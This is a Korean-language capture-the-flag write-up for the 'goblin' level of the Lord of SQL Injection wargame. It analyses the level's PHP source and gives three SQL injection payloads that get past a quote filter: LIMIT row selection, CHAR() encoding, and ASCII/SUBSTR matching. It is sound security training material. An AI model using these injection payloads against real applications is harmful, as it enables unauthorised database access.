# Lord of SQL Injection No.3 - goblin

## 문제 출제 의도

따옴표를 사용하지 않고 원하는 문자열을 SELECT 하도록 SQL을 조작할 수 있는지 확인한다.

## 소스 코드 분석

goblin 문제의 php 소스 코드는 다음과 같다.
```php
<?php 
  include "./config.php"; 
  login_chk(); 
  dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[no])) exit("No Hack ~_~"); 
  if(preg_match('/\'|\"|\`/i', $_GET[no])) exit("No Quotes ~_~"); 
  $query = "select id from prob_goblin where id='guest' and no={$_GET[no]}"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
  if($result['id'] == 'admin') solve("goblin");
  highlight_file(__FILE__); 
?>
```
-----

```php
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[no])) exit("No Hack ~_~"); 
  if(preg_match('/\'|\"|\`/i', $_GET[no])) exit("No Quotes ~_~"); 
```
* GET방식으로 no를 받고, no에 `prob`, `_`, `.`, `()` 가 들어 있으면 `No Hack ~_~`이 뜨고 문제 풀이에 실패한다.

* 또한, no에 `'`, `"`, \` 가 들어 있으면 `No Quotes ~_~`가 뜨고 문제 풀이에 실패한다.

```php
  $query = "select id from prob_goblin where id='guest' and no={$_GET[no]}"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
  if($result['id'] == 'admin') solve("goblin");
```
* 받은 no가 직접 쿼리에 들어간다. 이것으로 SQL Injection 공격이 가능하다는 것을 알 수 있다.

* 문제 풀이가 성공하는 조건은 '데이터베이스에서 받은 id에 "admin"이라는 값이 들어있음'이다.

-----

## Solution
    
1. LIMIT 구문 이용

    ```
    http://los.eagle-jump.org/goblin_5559aacf2617d21ebb6efe907b7dded8.php?no=-1 or 1=1 limit 1,1-- -
    ```
    ```sql
    select id from prob_goblin where id='guest' and no=-1 or 1=1 limit 1,1-- -
    ```

    LIMIT 구문을 이용한 SQL Injection이 잘 이해가 되지 않으면 [**2번 문제 - Cobolt**](https://gitlab.com/dsm-highschool/sql-injection-writeup/blob/master/12_%EC%9D%B4%EC%9E%AC%EC%84%9D/los_no2_cobolt.md)의 **Solution - 3. LIMIT 구문 이용** 부분을 참고하자.

2. CHAR 함수 및 ASCII 코드 활용

    ```
    http://los.eagle-jump.org/goblin_5559aacf2617d21ebb6efe907b7dded8.php?no=-1 or id=char(97, 100, 109, 105, 110)-- -
    ```
    ```sql
    select id from prob_goblin where id='guest' and no=-1 or id=char(97, 100, 109, 105, 110)-- -
    ```

    이는 ASCII에서 10진수 표기를 문자 표기로 바꿔주는 MySQL 함수인 CHAR를 이용하여 id가 admin인 행을 찾아 선택하도록 만든다.
    
    ASCII에서, 'a'=97, 'd'=100, 'm'=109, 'i'=105, 'n'=110이다.
    
    따라서 이는 $result['id']에 'admin'이 들어가도록 하므로 문제가 풀린다.

3. ASCII, SUBSTR 함수 및 ASCII 코드 활용

    ```
    http://los.eagle-jump.org/goblin_5559aacf2617d21ebb6efe907b7dded8.php?no=-1 or ascii(substr(id, 1, 1))=97-- -
    ```
    ```sql
    select id from prob_goblin where id='guest' and no=-1 or ascii(substr(id, 1, 1))=97-- -
    ```

    이는 ASCII에서 문자 표기자 10진수 표기로 바꿔주는 MySQL 함수인 ASCII를 이용하여 id가 a로 시작하는 행을 찾아 선택하도록 만든다.

    이번에는 운이 좋아 a로 시작하는 첫번째 행이 admin이었지만, 만약 안되면 1번째 글자가 a, 2번째 글자가 d, 3번째 글자가 m, 4번째 글자가 i, 5번째 글자가 n인 행을 찾도록 조작하면 된다.
    
    ASCII에서, 'a'=97이다.
    
    따라서 이는 $result['id']에 'admin'이 들어가도록 하므로 문제가 풀린다.